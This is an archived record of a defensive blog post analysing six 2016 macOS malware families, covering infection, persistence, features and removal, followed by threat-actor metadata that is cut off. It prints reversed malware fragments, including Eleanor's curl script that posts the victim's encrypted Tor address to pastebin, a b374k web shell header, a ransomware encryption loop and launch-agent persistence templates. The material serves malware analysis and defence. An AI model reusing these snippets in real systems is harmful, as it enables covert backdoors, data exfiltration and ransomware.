{
    "id": "f881cba8-e29a-4a7a-8a44-b84a7ab2bf72",
    "created_at": "2023-01-12T15:01:14.131512Z",
    "updated_at": "2025-03-27T02:17:11.183442Z",
    "deleted_at": null,
    "sha1_hash": "91689746aeb74da1ce20e558a75c1162dc8ce213",
    "title": "2017-01-01 - Mac Malware of 2016",
    "authors": "",
    "file_creation_date": "2022-05-29T01:22:12Z",
    "file_modification_date": "2022-05-29T01:22:12Z",
    "file_size": 2819158,
    "plain_text": "# Objective-See\n\n**objective-see.com/blog/blog_0x16.html**\n\nMac Malware of 2016\n\nâ€º a cumulative analysis of new OS X malware\n\n1/1/2017\n\nIntroduction\n\nDue to sheer volume, Windows malware generally dominates the malicious code and news scene. Of\ncourse, Macs are susceptible to malware as well and 2016 saw a handful of new malware targeting\nApple computers.\n\nIn this blog, I wanted to discuss all Mac malware that appeared this year. While each sample has been\nreported on before (i.e. by the AV company that discovered it), this blog aims to cumulatively cover all\nin one place. Moreover, for each, we'll identify the infection vector, persistence mechanism,\nfeatures/goals, and describe disinfection.\n\n[If you want to play along, all samples can be downloaded from Objective-See's malware page.](https://objective-see.com/malware.html)\n\nBy downloading the samples, you waive all rights to claim punitive, incidental and consequential\ndamages resulting from mishandling or self-infection ;)\n\nAlso, the 'disinfection' instructions provided in this blog are specific to each malware specimen. Often\nmalware can install other malware, or allow an remote attacker to do what ever they want. Thus if you\n[were/are infected by any of these samples, it's suggested you fully re-install OS X.](https://support.apple.com/en-us/HT204904%20)\n\n[I'm presenting a talk at RSA 2017 titled \"Meet and Greet with the macOS Malware Class of 2016\" In](https://www.rsaconference.com/events/us17/agenda/sessions/6105-meet-and-greet-with-the-macos-malware-class-of)\nthis talk I'll dive into the details of each of the malware specimens described here. In other words, think\nof this blog as a preview of my talk!\n\nHope to see you at RSA :)\n\nTimeline\n\n**KeRanger**\n\n3/2016\n\nThe first fully-functional, in-the-wild ransomware for OS X.\n\n\n-----\n\n**Eleanor**\n\n7/2016\n\nA PHP-based backdoor that exposed infected computers as a hidden Tor service.\n\n**Keydnap**\n\n7/2016\n\nA standard backdoor for OS X with a propensity for stealing credentials, and used Tor for its\ncommunications.\n\n**Fake File Opener**\n\n8/2016\n\nA rather annoying piece of adware, though it did have a unique persistence mechanism.\n\n**Mokes**\n\n9/2016\n\nA fairly standard OS X backdoor, that did support a wide range of features.\n\n**Komplex**\n\n9/2016\n\nA Russian (APT 28/FancyBear) OS X implant, that provided remote 'administrative' capabilities.\n\nKeRanger\n\n**KeRanger**\n\n**found on:** 3/2016\n\n**found by:** [PaloAlto Networks (report)](http://researchcenter.paloaltonetworks.com/2016/03/new-os-x-ransomware-keranger-infected-transmission-bittorrent-client-installer/)\n\n**infection vector:** infected application on developer's official website\n\n**features:** encrypt user files for ransom\n\n**disinfection:** reboot\n\nOSX/KeRanger is the first fully-functional, in-the-wild ransomware for OS X!\n\n\n-----\n\n**â€º infection vector**\nThis malware was unusual for a variety of reasons. First, its infection vector is somewhat (for Mac\nMalware) unique. In order to surreptitiously infect Mac users, the OSX/KeRanger authors hacked the\nofficial [website for a popular OS X bittorrent application, 'Transmission'](https://transmissionbt.com/)\n\nWith access to the website, the malware authors then infected the legitimate Transmission application\nwith OSX/KeRanger. Specifically, they added a new mach-O binary to application bundle (General.rtf).\n\nThe main function of the Transmission.app was modified to execute this malware's binary:\n\n//build path to source (General.rtf)\n\n__sprintf_chk(pathSrc, 0x0, 0x400, \"%s/Resources/General.rtf\", ...);\n\n//build path to destination (kernel_service)\n\n__sprintf_chk(pathDest, 0x0, 0x400, \"%s/Library/kernel_service\", ...);\n\n//read in source file\n\nrbx = fopen(pathSrc, \"rb\");\n\nvar_1448 = fread(r12, 0x1, r13, rbx);\n\nfclose(rbx);\n\n//write it out to destination\n\nr14 = fopen(pathDest, \"wb+\");\n\nfwrite(r12, var_1448, 0x1, r14);\n\nfclose(r14);\n\n\n-----\n\n//set it to executable\nchmod(pathDest, 0x40);\n\n//launch it!\nsystem(pathDest);\n\nFinally the malware authors re-signed the (now) infected application so that GateKeeper (in its default\nsettings) would not prevent the malware from executing:\n\nThus, any time an unsuspecting user downloaded and executed the Transmission application (again,\nfrom the official Transmission website) the malware would compromise their Mac. Yikes!\n\n**â€º persistence**\nAs far as I know, OSX/KeRanger does not contain any logic nor code to persist itself. Thus if the user\nreboots their system, or kills the malware's process, kernel_service, the malware will not be\nrestarted...unless the user re-runs the infected Transmission application.\n\n**â€º features**\nAnother unique aspect of OSX/KeRanger was its payload or goal. In short it attempted to encrypt for\nransom, user files. Yes, OSX/KeRanger was the first, fully-functional in-the-wild piece of ransomware\ntargeting Apple computers.\n\nReversing the malware reveals its ransomware logic:\n\n//encrypt /Users\n\nrecursive_task(\"/Users\", _encrypt_entry, _putReadme);\n\n//encrypt /Volumes\n\nrecursive_task(\"/Volumes\", _check_ext_encrypt, _putReadme);\n\n//build path to '.kernel_complete'\n\nsprintf_chk(0x0, 0x0, 0x400, \"%s/Library/.kernel_complete\"...);\n\n//write to file\n\nrbx = fopen(0x0, \"w\"); fwrite(\"do not touch this\\n\", 0x12, 0x1, rbx);\n\nAs shown in the pseudo-code snippet, OSX/KeRanger will encrypt all files under /Users/* as well as all\n\n\n-----\n\nfiles under /Volumes that match certain extensions (PaloAlto Network s report noted about 300,\nincluding .docs, .jpgs, .zips, .cpp, etc).\n\nFor each directory where the ransomware encrypts files, it creates a plaintext 'read-me' file the contains\ninstructions to the user how to pay the ransom in order to recover their files:\n\nOne final, interesting aspect of OSX/KeRanger is that some researchers have convincingly claimed it is\n[a rewrite or Mac version of the 'linux.encoder' ransomware. Their reasoning is quite compelling and](https://labs.bitdefender.com/2016/03/keranger-is-actually-a-rewrite-of-linux-encoder/)\nseems to confirm that oftentimes malware authors are quite keen on expanding their potential targets\nby porting the malicious creations to OS X.\n\n**â€º disinfection**\nSince (AFAIK) OSX/KeRanger does not persist, it is trivial to remove:\n\n1. kill the kernel_service process\n2. remove ~/Library/kernel_*\n3. upgrade to version 2.93+ of Transmission.app\n\nIt should be noted that currently Mac users should be protected anyways, as Apple revoked the signing\ncertificate (ID Z7276PX673), as well as updated their XProtect signatures:\n\n$ cat /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.plist\n<dict>\n<key>Description</key>\n<string>OSX.KeRanger.A</string>\n<key>LaunchServices</key>\n<dict>\n<key>LSItemContentType</key>\n<string>com.apple.application-bundle</string>\n</dict>\n<key>Matches</key>\n<array>\n<dict>\n<key>MatchFile</key>\n<dict>\n<key>NSURLTypeIdentifierKey</key>\n<string>public.unix-executable</string>\n</dict>\n<key>Pattern</key>\n<string>488DBDD0EFFFFFBE00000000BA0004000031C04989D8*31F6\n\n4C89E7*83F8FF7457C785C4EBFFFF00000000</string>\n\n\n-----\n\n...\n\nKeydnap\n\n**Keydnap**\n\n**found on:** 7/2016\n\n**found by:** [ESET (report)](http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/)\n\n**infection vector:** infected application on developer's official website\n\n**features:** backdoor & credential stealer\n\n**disinfection:** remove launch agents\n\nOSX/Keynap is fairly standard backdoor for OS X with a propensity for stealing credentials, and uses\nTor for its communications.\n\n**â€º infection vector**\nThe original infection vector for OSX/Keynap was never discovered. Eset states that, \"It is still not clear\n_how victims are initially exposed to OSX/Keydnap. It could be through attachments in spam messages,_\n_downloads from untrusted websites...\"_\n\nWhat is known is that it was distributed in a zip archive which contained a binary named screenshot.jpg\n. Since the filename contained a space at its end (i.e. \".jpg \") when a user double-clicked it, it would be\nexecuted by Terminal.app. In other words, the malware would be run.\n\nLater, it was discovered that the official Transmission website (transmissionbt.com), was hacked again\nðŸ™„ ...this time, to distribute Keydnap. Just as they had with OSX/KeRanger, the malware authors\ninfected the legitimate Transmission application, by adding an extra binary (License.rtf) then modifying\nthe application's code to execute it. The infected Transmission application was then (re)signed, with\nanother stolen or fraudulently obtained Apple developer ID: Shaderkin Igor (836QJ8VMCQ):\n\n\n-----\n\nThus for a time, any user that downloaded and ran Transmission.app would be infected with\nOSX/Keydnap.\n\n**â€º persistence**\nIn order to persist, OSX/Keydnap creates two launch agents, com.apple.iCloud.sync.daemon and\ncom.geticloud.icloud.photo:\n\nThe first launch agent plist (com.apple.iCloud.sync.daemon) tells the OS to execute a binary named\nicloudsyncd. This binary is the backdoor component of the malware.\n\nThe second launch agent plist (com.geticloud.icloud.photo) contains a path to the malware's command\nand control mechanisms. Named icloudproc, this binary is simply a copy of Tor2Web proxy.\n\n**â€º features**\nAs mentioned, icloudsyncd is the main component of the malware. It provides 'standard' backdoor or\nremote 'administrative' capabilities such ability to download and execute a file, including a python\nscripts:\n\n//exec downloaded python\n\nsprintf(var_430, \"/tmp/%s\", rbx);\n\nsprintf(var_830, \"python %s\", var_430);\n\n\n-----\n\nchmod(var_430, 0x1c0);\nsystem(var_830);\n\nOSX/Keydnap also contains logic to elevate its privileges, albeit in very unsophisticated method; just\nasking:\n\nPerhaps the most interesting feature of the malware, is its ability to dump credentials and other\n[sensitive information from the keychain. It does this via code from the open-source keychaindump](https://github.com/juuso/keychaindump)\nproject. (note however, AFAIK, this would generate an \"icloudsyncd wants to access the keychain\" alert\nthat the user would have to allow):\n\nOSX/Keydnap uses a Tor2Web proxy for command and control. An installed launch agent, icloudproc,\nis automatically started by the OS, and listens on 127.0.0.1:9050. As noted by ESET, the main\nbackdoor component (icloudsyncd) uses this proxy for communication purposes: \"Keydnap is using the\n_onion.to Tor2Web proxy over HTTPS to report back to its C&C server.\"_\n\n\n-----\n\nlea rdx, qword [0x10000bbe7] ; 127.0.0.1:9050\nmov esi, 0x2714\nxor eax, eax\nmov rdi, rbx\ncall curl_easy_setopt\n\n**â€º disinfection**\nOSX/Keydnap can be removed from an infected system, via the following steps:\n\n1. Via the 'launchctl unload' command, unload the backdoor and Tor proxy\n2. Remove the launch agent plist files /Library/LaunchAgents or ~/Library/LaunchAgents\n\ncom.apple.iCloud.sync.daemon.plist and com.geticloud.icloud.photo.plist\n3. Remove the launch agent binaries & files:\n\na) ~/Library/Application Support/com.apple.iCloud.sync.daemon/\nb) ~/Library/Application Support/com.geticloud/\n\nApple has also revoked the Apple developer ID that was used to sign the infected Transmission\napplication:\n$ spctl -a -t exec -vv Transmission.app\n/Volumes/Transmission/Transmission.app: CSSMERR_TP_CERT_REVOKED\n\nEleanor\n\n**Eleanor**\n\n**found on:** 7/2016\n\n**found by:** [BitDefender (report)](https://labs.bitdefender.com/2016/07/new-mac-backdoor-nukes-os-x-systems/)\n\n**infection vector:** fake (trojaned) application\n\n**features:** backdoor (php) with audio & video capture capabilities\n\n**disinfection:** remove launch agent\n\nOSX/Eleanor is another basic, albeit 'feature-complete' backdoor (php) for Mac computers.\n\n**â€º infection vector**\nSimilar to other OS X malware of 2016, OSX/Eleanor was distributed in an applications via the internet.\nHowever, it appears that the malware authors simple (re)created an abandoned application (\"EasyDoc\nConvertor\"), as opposed to hacking the official website of a legitimate application.\n\n\n-----\n\nThe malicious, fake EasyDoc Convertor application was hosted on the popular app sharing website\n[Mac Update. Thus, any user that downloaded and ran this application would be infected with Eleanor.](https://www.macupdate.com/)\n\n**â€º persistence**\nOSX/Eleanor installs three(!) launch agents in order to persist its various components. Obviously\nstealth was not something the malware authors cared about at all :P The three launch agents are:\n\n1. com.getdropbox.dropbox.integritycheck.plist â†’ conn\n2. com.getdropbox.dropbox.timegrabber.plist â†’ check_hostname\n3. com.getdropbox.dropbox.usercontent.plist â†’ dbd\n\nmv $DIR/com.getdropbox.dropbox.usercontent.plist\n~/Library/LaunchAgents/com.getdropbox.dropbox.usercontent.plist\n\nlaunchctl load ~/Library/LaunchAgents/com.getdropbox.dropbox.usercontent.plist\n\nmv $DIR/com.getdropbox.dropbox.integritycheck.plist\n~/Library/LaunchAgents/com.getdropbox.dropbox.integritycheck.plist\n\nlaunchctl load ~/Library/LaunchAgents/com.getdropbox.dropbox.integritycheck.plist\n\nmv $DIR/com.getdropbox.dropbox.timegrabber.plist\n~/Library/LaunchAgents/com.getdropbox.dropbox.timegrabber.plist\n\nlaunchctl load ~/Library/LaunchAgents/com.getdropbox.dropbox.timegrabber.plist\n\nThe first launch agent, com.getdropbox.dropbox.integritycheck.plist, executes a binary name conn.\nThis simply sets up a hidden Tor service. The second launch agent,\ncom.getdropbox.dropbox.timegrabber.plist executes a bash script name check_hostname. This script\npublishes name of the hidden Tor service to pastebin. The final launch\nagent,com.getdropbox.dropbox.usercontent.plist executes a binary named dbd, which is actually a\ncopy of Apple's PHP binary:\n\n$ codesign -dvv ~/Library/.dropbox/dbd\n\n...\n\nIdentifier=com.apple.php\n\n\n-----\n\nAuthority=Software Signing\nAuthority=Apple Code Signing Certification Authority\nAuthority=Apple Root CA\n\n**â€º features**\nA rather unique feature of Eleanor is that it essentially turns an infected host into a remotely accessible\nhidden Tor service. The command and control logic for this is implemented with the conn binary. Via\n[Objective-See's TaskExplorer utility, it is easy to the malware listening on both port 9060 and 9061:](https://objective-see.com/products/taskexplorer.html)\n\nThe malware gets these port values from one of its Tor configuration files,\n~/Library/.dropbox/sync/storage:\n\n$ cat sync/storage\n\nGeoIPFile /Users/user/Library/.dropbox/sync/data/list\n\nGeoIPv6File /Users/user/Library/.dropbox/sync/data/list6\n\nHiddenServiceDir /Users/user/Library/.dropbox/sync/hs\n\nHiddenServicePort 80 127.0.0.1:9991\n\nHiddenServicePort 22 127.0.0.1:9992\n\nSOCKSPort 9060\n\nControlPort 9061\n\nThe malware also contains a bash script named check_hostname, which, as previously mentioned, is\npersisted as a launch agent. The purpose of this script is to encrypt the name (address) of the hidden\n[Tor service that was setup by the first launch agent, and then publish that to pastebin. This of course](http://pastebin.com/)\nallows the attacker to 'find' and connect to the infected host.\n\nencrypt tor name ('hostname')\n\ne.g. 'xjd6uzkuyonxzrz2.onion'\n\nHOSTNAME=$(cat /Users/$USER/Library/.dropbox/sync/hs/hostname | cut -d '.' -f 1 | openssl rsautl encrypt -pubin -inkey /Users/$USER/Library/.dropbox/public.key | openssl enc -base64 | sed\n\"s/\\+/PLUS/g\")\n\npost to pastebin\npastebin.com/api/api_post.php\nPASTEID=$(curl -sd\n\"api paste code=$HOSTNAME&api option=paste&api dev key=d1e52e9d2452e1810279527aa1a83c8b\n\n\n-----\n\n&api_paste_private=1&api_user_key=df8a73a0813c422465564c913e760d87\n\"http://pastebin.com/api/api_post.php\" | cut -d \"/\" -f 4)\n\nThe core backdoor logic of OSX/Eleanor, is actually implemented in PHP - this is why the malware has\na copy of Apple's PHP binary. Specifically the malware contains a copy of the b374k shell (v 3.2.3)\n[which is available online at github.com/b374k.](https://github.com/b374k)\n<?php\n/*\nb374k shell 3.2.3\nJayalah Indonesiaku\nhttps://github.com/b374k/b374k\n*/\n$GLOBALS['pass'] = \"15bd408e435dc1a1509911cfd8c312f46ed54226\";\n$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$b374k=$func('$ ...\n\nThe PHP shell affords the attacker complete over an infected remote computer:\n\n\n-----\n\nTo further extend the features, or capabilities of the malware, it 'ships' with several utilities such as\n[netcat and wacaw. The latter, wacaw, is available online where it is described as \"a little command-line](http://webcam-tools.sourceforge.net/)\n_tool for Mac OS X that allows you to capture both still pictures and video from an attached camera\"._\nThus an attacker could record the user of an infected Mac.\n\n**â€º disinfection**\nTo remove OSX/Eleanor from a system, simply unload then delete the three aforementioned launch\nagents. Following this, delete the 'hidden' ~/Library/.dropbox directory and the malicious EasyDoc\nConvertor application.\n\nApple has also updated XProtect with a signature to block Eleanor:\n\n$ cat /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.plist\n\n<key>Description</key>\n\n<string>OSX.Eleanor.A</string>\n\n<key>LaunchServices</key>\n\n<dict>\n\n<key>LSItemContentType</key>\n\n<string>com.apple.application-bundle</string>\n\n</dict>\n\n<key>Matches</key>\n\n<array>\n\n<dict>\n\n<key>MatchType</key>\n\n\n-----\n\n<string>MatchAny</string>\n<key>Matches</key>\n<array>\n<dict>\n<key>MatchFile</key>\n<dict>\n<key>NSURLTypeIdentifierKey</key>\n<string>public.unix-executable</string>\n</dict>\n<key>MatchType</key>\n<string>Match</string>\n<key>Identity</key>\n<data>3mQnUelrjFN0TwMab36SnVMiYyE=</data>\n</dict>\n<dict>\n<key>MatchFile</key>\n<dict>\n<key>NSURLTypeIdentifierKey</key>\n<string>public.unix-executable</string>\n</dict>\n...\n\nFake File Opener\n\n**Fake File Opener**\n\n**found on:** 8/2016\n\n**found by:** [MalwareBytes (report)](https://blog.malwarebytes.com/threat-analysis/2016/08/pcvark-plays-dirty/)\n\n**infection vector:** fake ('security') popup\n\n**features:** adware, adware installer\n\n**disinfection:** delete application\n\nOSX/FakeFileOpener is a rather silly piece of adware, though it does have a unique persistence\nmechanism.\n\n**â€º infection vector**\nOSX/FakeFileOpener is installed along with other annoying OS X adware when a user is tricked into\nbelieving a fake security alert originating from 'AdvancedMacCleaner.com'\n\n\n-----\n\nIf the user clicks 'Install Security Upgrade Now' button and executes the downloaded adware installer\npackage, they will infect themselves. As the OSX/FakeFileOpener adware application, 'Mac File\nOpener.app' was signed, Gatekeeper (in its default settings) would allow it to execute:\n\n**â€º persistence**\nThomas Reed (@thomasareed), the malware reverser who originally analyzed the sample noted that,\n_\"even more intriguing, this app didn't have any apparent mechanism for being launched. It hadn't been_\n_added to my login items. There wasn't a new launch agent or daemon designed to load it. It simply_\n_seemed to be sitting there, doing nothing.\"_\n\nDigging deeper, he discovered that this malicious application (by means of its Info.plist file) registers\nitself as the 'document handler' for a myriad of file types. In his words:\n\n_\"Essentially, what this app had done is set itself up as an app that can open most files that are at all_\n_likely to be on the typical user's system. Worse, if there is no other app to open a specific file, this app_\n_would be the default. It turns out that this is exactly what that app wants, and it takes full advantage of_\n\n\n-----\n\n_that fact._\n\nSince this mechanism requires a user launch an application that previously didn't have a default\n'document handler' and matches one that 'Mac File Opener' registered for, this is somewhat of a\n'unreliable' persistence mechanism. However, the upside to this method is that it will 'bypass' tools such\nas [BlockBlock that monitor for true persistence mechanisms (i.e. ones that require no user interaction,](https://objective-see.com/products/blockblock.html)\ninstead are automatically executed each time the system is rebooted or the user logs in).\n\nIt's rare to find novel persistence mechanisms in OS X malware. As such, I previously dedicated an\n[entire blog post, titled, \"Click File, App Opens\" that digs into the technical details of this persistence and](https://objective-see.com/blog/blog_0x12.html)\nhow, at the OS level, such document handlers work.\n\n**â€º features**\nOSX/FakeFileOpenor is part of a fairly standard run-of-the-mill OS X adware package. It appears that\nits goal is simply to get the user to install more adware. Specifically, whenever the Mac File Opener.app\nis launched (when the user tries to open any file it has registered a document handler for), it will display\na popup with a 'Search Web' button. If the user clicks this button, it will load www.macfileopener.org in a\nbrowser window.\n\n\n-----\n\nvoid -[AppDelegate searchWeb:]\n{\nvar_80 = [[@\"Adva\" stringByAppendingString:@\"nced Ma\"] stringByAppendingString:@\"c Cleaner\"];\nvar_88 = [[@\"Mac A\" stringByAppendingString:@\"dware C\"] stringByAppendingString:@\"leaner\"];\nvar_90 = [[@\"Mac Sp\" stringByAppendingString:@\"ace Re\"] stringByAppendingString:@\"viver\"];\nvar_98 = [[@\"Disk R\" stringByAppendingString:@\"evi\"] stringByAppendingString:@\"ver\"];\nvar_A0 = [[@\"Disk Cl\" stringByAppendingString:@\"eanu\"] stringByAppendingString:@\"p Pro\"];\n....\n\n[[NSWorkspace sharedWorkspace] openURL:[NSURL URLWithString:[NSString\nstringWithFormat:@\"http://macfileopener.com/ ext/%@/?\namc=%@&madc=%@&msr=%@&drv=%@&dcp=%@\", [var_30 extension], var_58, var_60, var_68,\nvar_70, var_78]]];\n\nThis website will often display other adware-related popups and alerts to trick the user into\ndownloading and installing even more malware. As Thomas Reed notes; \"these pages will download\n_other junk PCVARK apps, such as Mac Adware Remover or Mac Space Reviver.\"_\n\n**â€º disinfection**\nTo remove OSX/FakeFileOpenor, simply delete the Mac File Opener application. Behind the scenes\nthis will cause the OS to also unregister its document handlers:\n\n# fs_usage -w -f filesystem | grep csstore\n\nrename com.apple.LaunchServices-134501.csstore~ lsd.31116\nopen com.apple.LaunchServices-134501.csstore lsd.31116\nWrData[AT2] com.apple.LaunchServices-134501.csstore lsd.31116\nWrData[AT2] com.apple.LaunchServices-134501.csstore lsd.31116\n\n$ /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework\n/Support/lsregister -dump | grep \"Mac File Opener\" | wc\n\n0  0  0\n\nMokes\n\n**Mokes**\n\n**found on:** 9/2016\n\n\n-----\n\n**Mokes**\n\n**found by:** [Kaspersky (report)](https://securelist.com/blog/research/75990/the-missing-piece-sophisticated-os-x-backdoor-discovered/)\n\n**infection vector:** unknown\n\n**features:** backdoor, with logic to capture; screen shots, audio, video, & keystrokes.\n\n**disinfection:** delete launch agent\n\nWhile OSX/Mokes does support a wide range of features, at its core, it's still a fairly standard OS X\nbackdoor.\n\n**â€º infection vector**\nHow user are become infected by OSX/Mokes is still unknown. Kaspersky, the AV company that\ndiscovered it, stated, \"...we can only speculate how this malware makes it to the victim machine. All\n_vectors are possible: exploits, installation via another previously installed malware and of course via_\n_social engineering.\"_\n\n**â€º persistence**\nLaunch Agents are the preferred method of persistence for OS X malware. OSX/Mokes conforms to\nthis trend installing itself launch agent via the storeuserd.plist in ~/Library/LaunchAgents/. Looking at its\ndisassembly, its easy to find the embedded template the malware uses for the launch agent:\n\nEkomsAutorun::service(void)::launchdContextTemplate\ndb '<?xml version=\"1.0\" encoding=\"UTF-8\"?>',0Ah\ndb '<plist version=\"1.0\">',0Ah\ndb '<dict>',0Ah\ndb 9,'<key>Label</key>',0Ah\ndb 9,'<string>%1</string>',0Ah\ndb 9,'<key>ProgramArguments</key>',0Ah\ndb 9,'<array>',0Ah\ndb 9,9,'<string>%2</string>',0Ah\ndb 9,'</array>',0Ah\ndb 9,'<key>RunAtLoad</key>',0Ah\ndb 9,'<true/>',0Ah\ndb 9,'<key>KeepAlive</key>',0Ah\ndb 9,'<true/>',0Ah\ndb '</dict>',0Ah\ndb '</plist>',0Ah,0\n\n\n-----\n\n**â€º features**\nBesides basic features such as download and execute, OSX/Mokes supports a fairly wide range of\nother capabilities as noted by Kaspersky: \"This malware...is able to steal various types of data from the\n_victimâ€™s machine (Screenshots, Audio-/Video-Captures, Office-Documents, Keystrokes).\" One can_\nconfirm this by reversing the malware's binary. For example, below are several hard-coded file search\nconstants:\n\n0000001C unicode :/file-search\n\n0000000E unicode *.xlsx\n\n0000000C unicode *.xls\n\n0000000E unicode *.docx\n\n0000000C unicode *.doc\n\nThe malware also monitors for removable media (e.g. USB sticks). To record the user, the malware\nutilizes the QT. This cross-platform framework contains OS X-specific webcams recording code:\n\n//embedded QT methods\n\nAVFMediaRecorderControl::AVFMediaRecorderControl(AVFCameraService *,QObject *)\n\nAVFMediaRecorderControl::setState(QMediaRecorder::State)\n\nAVFMediaRecorderControl::setupSessionForCapture(void)\n\n//disassembly of 'setupSessionForCapture' method\n\nAVFMediaRecorderControl::setupSessionForCapture(void) proc\n...\ncall AVFCameraSession::state(void)\n\ncall AVFAudioInputSelectorControl::createCaptureDevice(void)\n\nlea rdx, \"Could not connect the video recorder\"\n\n\n-----\n\ncall QMediaRecorderControl::error(int,QString const&)\n\n**â€º disinfection**\nRemoving OSX/Mokes is a touch complex, as the malware may install itself into multiple locations.\nOnce the malware is detected though, simply unload its launch agent (e.g. launchctl unload\n~/Library/LaunchAgents/storeuserd.plist) then delete its binary (e.g. storeuserd).\n\nBesides the standard storeuserd name, the malware may install itself to:\n\n~/Library/com.apple.spotlight/SpotlightHelper\n~/Library/Dock/com.apple.dock.cache\n~/Library/Skype/SkypeHelper\n~/Library/Dropbox/DropboxCache\n~/Library/Google/Chrome/nacld\n~/Library/Firefox/Profiles/profiled\n\nKomplex\n\n**Komplex**\n\n**found on:** 9/2016\n\n**found by:** [PaloAlto Networks (report)](http://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/)\n\n**infection vector:** email\n\n**features:** backdoor, with standard features\n\n**disinfection:** delete launch agent\n\nRussian cyber-operations were a popular topic in 2016. OSX/Komplex is one of the Russian's (APT\n28/Fancy Bear's) OS X implants.\n\n**â€º infection vector**\nOSX/Komplex is a Mac application that is distributed via email (as an attachment). When executed, it\nwill infect the system, but also display an PDF document in a (lame) attempt to hide the infection. The\nantivirus company Intego, notes that:\n\n\"The person who receives the email may think they are opening a PDF file with future plans for the\n_Russian aerospace program, but in fact, it is a Trojan that will install files on the system and connect to_\n_a remote command & control (c&c) server.\"_\n\n\n-----\n\nLooking at the disassembly of the malware's main function shows the malware opening the embedded\nPDF, via the Preview application:\n\nint main(int arg0, int arg1)\n\n{\nvar_38 = [NSSearchPathForDirectoriesInDomains(0xf, 0x1, 0x1) objectAtIndex:0x0];\n\nvar_48 = [NSString stringWithFormat:@\"SetFile -a E %@/roskosmos_2015-2025.pdf\", var_38];\n\nvar_50 = [NSString stringWithFormat:@\"rm -rf %@/roskosmos_2015-2025.app\", var_38];\n\nvar_58 = [NSString stringWithFormat:@\"open -a Preview.app %@/roskosmos_2015-2025.pdf\",\nvar_38];\n\nsystem([var_50 UTF8String]);\n\nsystem([var_48 UTF8String]);\n\nsystem([var_58 UTF8String]);\n\n**â€º persistence**\nHow does this malware persist? If you guessed launch agent, you are right! OSX/Komplex persists via\n~/Library/LaunchAgents/com.apple.updates.plist. This persistent launch agent plist, points to a\nmalware's binary which is located in /Users/Shared/.local/kextd.\n\n$ cat ~/Library/LaunchAgents/com.apple.updates.plist\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<plist version=\"1.0\">\n\n<dict>\n\n<key>Label</key>\n\n<string>com.apple.updates</string>\n\n<key>ProgramArguments</key>\n\n<array>\n\n<string>/Users/Shared/.local/kextd</string>\n\n</array>\n\n\n-----\n\n<key>RunAtLoad</key>\n<true/>\n...\n\n**â€º features**\nWhen executed, OSX/Komplex first checks if it is being debugged or executed on a system that is not\nconnected to the internet:\n\nint main(int argc, char* argv[])\n{\n\nif ((AmIBeingDebugged() & 0x1) == 0x0)\n{\nwhile ((connectedToInternet() & 0x1 & 0x1) == 0x0)\n{\nsleep(0x3c);\n}\nrax = sub_100005b40();\n}\nelse\n{\nremove(*argv);\nrax = 0x0;\n}\n\nreturn rax;\n}\n\nOSX/Komplex implements only few basic features. However, these are sufficient to allow a remote\nattacker to completely control an infected host. These features include:\n\ndownload a file\ndelete a file\nconfigure the backdoor\nexecuting a file\nexecuting a shell command\n\n$ nm Komplex | c++filt -p -i | grep File\n0000000100001e60 T FileExplorer::executeFile(char const*, unsigned long)\n0000000100001b90 T FileExplorer::getFileName()\n0000000100001b70 T FileExplorer::setFileName(char*)\n0000000100001e00 T FileExplorer::setParameters(char*)\n0000000100001bd0 T FileExplorer::executeShellCommand()\n0000000100001e20 T FileExplorer::setRemove()\n\nBesides the Russia connection, OSX/Komplex is rather interesting as the PaloAlto researchers note it\nmay have actually been spotted before. In 2015, BAE systems released a report title \"New Mac OS\nMalware Exploits Mackeeper.\" In this report they describe a new (unnamed) piece of malware that\n\n\n-----\n\nexploited a remote vulnerability in the infamous MacKeeper software in order to infect Mac users. The\nPaloAlto researchers noted a lot of similar code, leading them to state, \"these overlaps suggest that the\n_Trojan delivered by the MacKeeper vulnerability was in fact the Komplex Trojan.\"_\n\n**â€º disinfection**\nIt is trivial to remove OSX/Komplex. First simply unload the malware's launch agent\n(~/Library/LaunchAgents/com.apple.updates.plist). Then delete both the launch agent plist and binary:\n\n$ launchctl unload ~/Library/LaunchAgents/com.apple.updates.plist\n\n$ rm ~/Library/LaunchAgents/com.apple.updates.plist\n\n$ rm /Users/Shared/.local/kextd\n\nConclusion\nWell that's a wrap! In this blog we discussed (all?) Mac malware that emerged in 2016. Hopefully 2017\nwill bring us lots of new malware to play with :)\n\nÂ© 2017 objective-see llc\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-01-01 - Mac Malware of 2016.pdf"
    ],
    "report_names": [
        "2017-01-01 - Mac Malware of 2016.pdf"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
